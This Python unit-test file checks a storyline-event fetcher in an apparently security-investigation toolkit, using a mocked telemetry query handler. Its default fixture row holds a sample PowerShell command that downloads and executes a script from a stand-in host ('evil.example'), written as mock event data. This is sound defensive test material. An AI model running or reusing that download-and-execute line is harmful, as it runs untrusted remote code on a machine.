"""Unit tests for the get_storyline_events tool.

Exercises the standalone storyline fetcher that was split out of
`initiate_investigation`. The library logic (`fetch_storyline_events`)
runs against a mocked SDLPowerQueryHandler, so the tests cover only the
adapter wiring + status branching, not actual SDL behavior.
"""

import json
from collections.abc import Callable
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from purple_mcp.libs.sdl.enums import PQColumnType
from purple_mcp.libs.sdl.models import SDLTableResultData
from purple_mcp.tools import storyline as storyline_tool


def _make_sdl_result(rows: list[list[str]] | None = None) -> SDLTableResultData:
    """Build an SDLTableResultData with the storyline projection columns."""
    if rows is None:
        rows = [
            [
                "1730000000000",
                "Command Script",
                "command_script",
                "HOST-1",
                "windows",
                "powershell.exe",
                "powershell -c iex(irm http://evil.example/p)",
                "8220",
                "GROUPON\\user",
                "9A1F9530EF5DF7B6",
            ],
        ]
    return SDLTableResultData.model_validate(
        {
            "matchCount": len(rows),
            "values": rows,
            "columns": [
                {"name": "event.time", "type": PQColumnType.TIMESTAMP},
                {"name": "event.type", "type": PQColumnType.STRING},
                {"name": "event.category", "type": PQColumnType.STRING},
                {"name": "endpoint.name", "type": PQColumnType.STRING},
                {"name": "endpoint.os", "type": PQColumnType.STRING},
                {"name": "src.process.name", "type": PQColumnType.STRING},
                {"name": "src.process.cmdline", "type": PQColumnType.STRING},
                {"name": "src.process.pid", "type": PQColumnType.STRING},
                {"name": "src.process.user", "type": PQColumnType.STRING},
                {"name": "src.process.storyline.id", "type": PQColumnType.STRING},
            ],
        }
    )


@pytest.fixture
def mock_sdl_handler() -> MagicMock:
    """SDLPowerQueryHandler mock with a single-row result by default."""
    handler = MagicMock()
    handler.submit_powerquery = AsyncMock()
    handler.poll_until_complete = AsyncMock(return_value=_make_sdl_result())
    handler.is_result_partial = MagicMock(return_value=False)
    handler.query_submitted = False
    handler.query_id = None
    handler.is_query_completed = MagicMock(return_value=True)
    handler.delete_query = AsyncMock()
    sdl_query_client = MagicMock()
    sdl_query_client.is_closed = MagicMock(return_value=True)
    sdl_query_client.close = AsyncMock()
    handler.sdl_query_client = sdl_query_client
    return handler


@pytest.mark.asyncio
async def test_get_storyline_events_happy_path(
    mock_settings: Callable[..., MagicMock],
    mock_sdl_handler: MagicMock,
) -> None:
    """A successful query returns ok status with the curated columns."""
    storyline_id = "9A1F9530EF5DF7B6"

    with (
        patch(
            "purple_mcp.tools.storyline.get_settings",
            return_value=mock_settings(),
        ),
        patch(
            "purple_mcp.libs.investigation.collector.SDLPowerQueryHandler",
            return_value=mock_sdl_handler,
        ),
    ):
        result = await storyline_tool.get_storyline_events(storyline_id)

    section = json.loads(result)
    assert section["status"] == "ok"
    assert section["storyline_id"] == storyline_id
    # The query string should contain BOTH src/tgt storyline filters
    assert "src.process.storyline.id='9A1F9530EF5DF7B6'" in section["query"]
    assert "tgt.process.storyline.id='9A1F9530EF5DF7B6'" in section["query"]
    assert section["returned_count"] == 1
    assert section["events"][0]["fields"]["event.type"] == "Command Script"
    assert section["events"][0]["fields"]["src.process.name"] == "powershell.exe"


@pytest.mark.asyncio
async def test_get_storyline_events_empty_result(
    mock_settings: Callable[..., MagicMock],
    mock_sdl_handler: MagicMock,
) -> None:
    """No rows in the SDL response → status='empty', no error."""
    mock_sdl_handler.poll_until_complete = AsyncMock(return_value=_make_sdl_result(rows=[]))

    with (
        patch(
            "purple_mcp.tools.storyline.get_settings",
            return_value=mock_settings(),
        ),
        patch(
            "purple_mcp.libs.investigation.collector.SDLPowerQueryHandler",
            return_value=mock_sdl_handler,
        ),
    ):
        result = await storyline_tool.get_storyline_events("ABCDEF1234567890")

    section = json.loads(result)
    assert section["status"] == "empty"
    assert section["storyline_id"] == "ABCDEF1234567890"
    assert section.get("error") in (None, "")


@pytest.mark.asyncio
async def test_get_storyline_events_sdl_failure_isolated(
    mock_settings: Callable[..., MagicMock],
    mock_sdl_handler: MagicMock,
) -> None:
    """SDL failure is caught inside the section: status='failed', not raised."""
    mock_sdl_handler.submit_powerquery = AsyncMock(
        side_effect=RuntimeError("SDL: Service unavailable"),
    )

    with (
        patch(
            "purple_mcp.tools.storyline.get_settings",
            return_value=mock_settings(),
        ),
        patch(
            "purple_mcp.libs.investigation.collector.SDLPowerQueryHandler",
            return_value=mock_sdl_handler,
        ),
    ):
        result = await storyline_tool.get_storyline_events("9A1F9530EF5DF7B6")

    section = json.loads(result)
    assert section["status"] == "failed"
    assert "Service unavailable" in section["error"]


@pytest.mark.asyncio
async def test_get_storyline_events_validates_inputs(
    mock_settings: Callable[..., MagicMock],
) -> None:
    """Empty storyline_id and out-of-range limits raise ValueError early."""
    with patch(
        "purple_mcp.tools.storyline.get_settings",
        return_value=mock_settings(),
    ):
        with pytest.raises(ValueError):
            await storyline_tool.get_storyline_events("")
        with pytest.raises(ValueError):
            await storyline_tool.get_storyline_events("9A1F", limit=0)
        with pytest.raises(ValueError):
            await storyline_tool.get_storyline_events("9A1F", time_window_hours=-1)


@pytest.mark.asyncio
async def test_get_storyline_events_rejects_quote_in_id(
    mock_settings: Callable[..., MagicMock],
    mock_sdl_handler: MagicMock,
) -> None:
    """Defensive: a single quote in the id would break PQ string quoting."""
    with (
        patch(
            "purple_mcp.tools.storyline.get_settings",
            return_value=mock_settings(),
        ),
        patch(
            "purple_mcp.libs.investigation.collector.SDLPowerQueryHandler",
            return_value=mock_sdl_handler,
        ),
    ):
        result = await storyline_tool.get_storyline_events("bad'id")

    section = json.loads(result)
    assert section["status"] == "failed"
    assert "single quote" in section["error"]
